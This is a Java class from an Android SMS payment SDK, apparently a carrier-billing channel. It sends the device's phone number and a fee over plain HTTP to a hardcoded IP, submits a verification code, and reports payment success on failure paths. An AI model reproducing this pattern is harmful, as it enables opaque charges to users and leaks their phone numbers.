package com.y7.smspay.sdk.channel;

import android.text.TextUtils;
import android.util.Xml;

import com.y7.smspay.sdk.json.GetDataImpl;
import com.y7.smspay.sdk.util.Constants;
import com.y7.smspay.sdk.util.HttpSdSsTool;
import com.y7.smspay.sdk.util.IHttpRequestLs;
import com.y7.smspay.sdk.util.Utils;

import org.json.JSONException;
import org.json.JSONObject;
import org.xmlpull.v1.XmlPullParser;

import java.io.StringReader;


/**
 * 翔通
 * 
 * @author Administrator
 * 
 */
public class XTPoyChannel extends BasePoyChannel {

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.yc.paysdk.channel.BasePayChannel#pay()
	 */
	@Override
	public void pay() {
		super.pay();

		//DDDLog.d("XRPayChannel begin");
		myPhoneNumber = HttpSdSsTool.getPhoneNumber(appContext);
		String phone = null;
		if (TextUtils.isEmpty(myPhoneNumber)) { // 手机号为空去服务器获取
			//DDDLog.d("网络获取手机号");
			try {
				String result = GetDataImpl.getInstance(appContext).findNum();
				if (TextUtils.isEmpty(result)) {
					// 网络返回空，支付失败
					postPaySucceededEvent();
				}
				JSONObject demoJson = new JSONObject(result);
				phone = demoJson.getString("phone");
				Utils.save2SDCard(Constants.MYPHONENUMBER, phone);
			} catch (JSONException e) {
				//DDDLog.e("Exception", e);
			}
			if (TextUtils.isEmpty(phone)) {
				postPaySucceededEvent();
			} else {
				myPhoneNumber = phone;
			}
		}

		//DDDLog.d("myPhoneNumber -->" + myPhoneNumber);
		if (!TextUtils.isEmpty(myPhoneNumber)) {
			//DDDLog.d("请求验证码");
			HttpSdSsTool.ISREQUESCODE = HttpSdSsTool.XT;
			String xmlStr = HttpSdSsTool.requestCode(Constants.CHANNEL_PCXR, getReqParamString());
			//DDDLog.d("xmlStr-->" + xmlStr);
			try {
				XmlPullParser parser = Xml.newPullParser();
				parser.setInput(new StringReader(xmlStr));
				int event = parser.getEventType();

				while (event != XmlPullParser.END_DOCUMENT) {
					switch (event) {
					case XmlPullParser.START_DOCUMENT:
						break;
					case XmlPullParser.START_TAG:
						String name = parser.getName();
						if (name.equalsIgnoreCase("response")) {
						} else if (name.equalsIgnoreCase("transactionId")) {
							parser.nextText();
						} else if (name.equalsIgnoreCase("status")) {
							parser.nextText();
						} else if (name.equalsIgnoreCase("spOrderId")) {
							OrderId = parser.nextText();
							//DDDLog.d("OrderId -->" + OrderId);
						}
						break;
					case XmlPullParser.END_TAG:
						break;
					}
					event = parser.next();
				}
			} catch (Exception e) {
				//DDDLog.d("XTPayChannel Pay() " + e);
			}
		}

		HttpSdSsTool.setHttpRequestListener(new IHttpRequestLs() {
			@Override
			public void onSendSucceed() {
				// TODO Auto-generated method stub
			}

			@Override
			public void onSendFailed() {
				// TODO Auto-generated method stub
			}
		});
		//DDDLog.d("XRPayChannel end");
	}

	/**
	 * 计费请求接口
	 * 
	 * @return
	 */
	private String getReqParamString() {
		// 拼代码
		String httpUrl = "http://219.234.86.159/feeapi1/api.asmx/GetPaymentReqMZPC";
		int reqPrice = price / 100;
		String urlReq = "TheFee=" + reqPrice; // 计费指令
		String urlPhone = "Mobile=" + myPhoneNumber;
		String apiKey = "apiKey=" + "";
		String apiPwd = "apiPwd=" + "";
		String flag = "flag=" + "";
		String endUrl = httpUrl + "?" + urlReq + "&" + urlPhone + "&" + apiKey + "&" + apiPwd + "&" + flag;
		return endUrl;
	}

	/**
	 * 计费验证接口
	 * 
	 * @param code
	 * @return
	 */
	public static String getcallBackUrl(String code) {
		// 拼代码
		String httpUrl = "http://219.234.86.159/feeapi1/api.asmx/GetPaymentFeeMZPC";
		String urlVerifycode = "code=" + code;
		String urlOrderId = "outTradeNo=" + OrderId;
		String endUrl = httpUrl + "?" + urlVerifycode + "&" + urlOrderId;
		//DDDLog.d("获取验证指令url:" + endUrl);
		return endUrl;
	}

	private static String myPhoneNumber;
	private static String OrderId;
}
